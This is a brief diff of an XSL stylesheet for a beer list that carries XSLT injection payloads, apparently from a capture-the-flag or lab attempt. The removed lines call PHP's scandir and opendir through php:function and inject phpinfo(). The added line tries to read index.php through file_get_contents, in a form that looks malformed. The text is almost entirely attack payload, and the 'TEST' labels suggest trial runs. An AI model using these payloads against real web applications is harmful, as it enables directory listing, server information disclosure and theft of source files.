@@ -4,14 +4,12 @@
 <xsl:for-each select="beers/beer">
   <div style="background-color:teal;color:white;padding:4px">
     <span style="font-weight:bold">
-    <xsl:variable name="fd" select="php:function('scandir', '.')" />
-    FD = <xsl:value-of select="php:functionString('opendir', '.')"/>
-    <xsl:processing-instruction name="php">phpinfo();?</xsl:processing-instruction>
+    FD = <xsl:value-of select="php:function('file_get_contents(`index.php`)')"/>
     </span>
   </div>
   <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
     <p>
-    TEST 4
+    TEST 1
     <span style="font-style:italic"> (<xsl:value-of select='prct'/> %) </span>
     </p>
   </div>
